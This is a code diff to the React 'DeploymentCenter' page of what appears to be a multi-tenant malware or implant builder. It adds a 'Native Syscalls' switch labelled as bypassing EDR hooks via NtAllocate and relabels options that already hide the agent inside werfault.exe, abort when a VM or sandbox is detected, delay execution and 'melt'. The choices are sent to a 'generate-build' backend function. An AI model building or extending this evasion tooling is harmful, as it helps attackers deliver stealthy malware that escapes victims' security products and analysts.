@@ -22,6 +22,7 @@ import {
   History,
   Clock,
   ShieldAlert,
+  Fingerprint,
 } from "lucide-react";
 import { useTenant } from "@/hooks/use-tenant";
 import { supabase } from "@/integrations/supabase/client";
@@ -50,11 +51,12 @@ export default function DeploymentCenter() {
   const [progress, setProgress] = useState(0);
   const [redownloadingId, setRedownloadingId] = useState<string | null>(null);
 
-  // New Stealth & Evasion State
+  // Updated Stealth & Evasion State including Native Syscalls
   const [stealthConfig, setStealthConfig] = useState({
     delay: 30,
     antiVM: true,
     processGhost: "werfault.exe",
+    nativeSyscalls: true, // New: Bypasses standard VirtualAlloc hooks
     melt: false,
   });
 
@@ -91,7 +93,7 @@ export default function DeploymentCenter() {
     }, 1500);
 
     try {
-      // Updated payload to include stealth configuration
+      // Updated payload to include the new syscalls flag
       const { data, error } = await supabase.functions.invoke<{ buildId?: string }>("generate-build", {
         body: {
           api_key: tenant.apiKey,
@@ -235,7 +237,7 @@ export default function DeploymentCenter() {
             <div className="space-y-4 rounded-xl border bg-muted/10 p-5">
               <h3 className="text-sm font-semibold flex items-center gap-2">
                 <ShieldAlert className="h-4 w-4 text-primary" />
-                Stealth & Evasion Parameters
+                Advanced Evasion Parameters
               </h3>
               <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                 <div className="space-y-2">
@@ -258,15 +260,30 @@ export default function DeploymentCenter() {
                   <p className="text-[10px] text-muted-foreground">Mask agent within trusted system process.</p>
                 </div>
               </div>
-              <div className="flex items-center justify-between pt-2 border-t">
-                <div className="space-y-0.5">
-                  <Label className="text-xs">Anti-VM / Sandbox Guard</Label>
-                  <p className="text-[10px] text-muted-foreground">Abort execution if virtualization is detected.</p>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6 pt-4 border-t">
+                <div className="flex items-center justify-between">
+                  <div className="space-y-0.5">
+                    <Label className="text-xs flex items-center gap-1.5">
+                      <Fingerprint className="h-3 w-3" /> Native Syscalls
+                    </Label>
+                    <p className="text-[10px] text-muted-foreground">Bypass EDR hooks via NtAllocate.</p>
+                  </div>
+                  <Switch
+                    checked={stealthConfig.nativeSyscalls}
+                    onCheckedChange={(v) => setStealthConfig({ ...stealthConfig, nativeSyscalls: v })}
+                  />
                 </div>
-                <Switch
-                  checked={stealthConfig.antiVM}
-                  onCheckedChange={(v) => setStealthConfig({ ...stealthConfig, antiVM: v })}
-                />
+                <div className="flex items-center justify-between">
+                  <div className="space-y-0.5">
+                    <Label className="text-xs">Anti-VM Guard</Label>
+                    <p className="text-[10px] text-muted-foreground">Exit if virtualization detected.</p>
+                  </div>
+                  <Switch
+                    checked={stealthConfig.antiVM}
+                    onCheckedChange={(v) => setStealthConfig({ ...stealthConfig, antiVM: v })}
+                  />
+                </div>
               </div>
             </div>
 
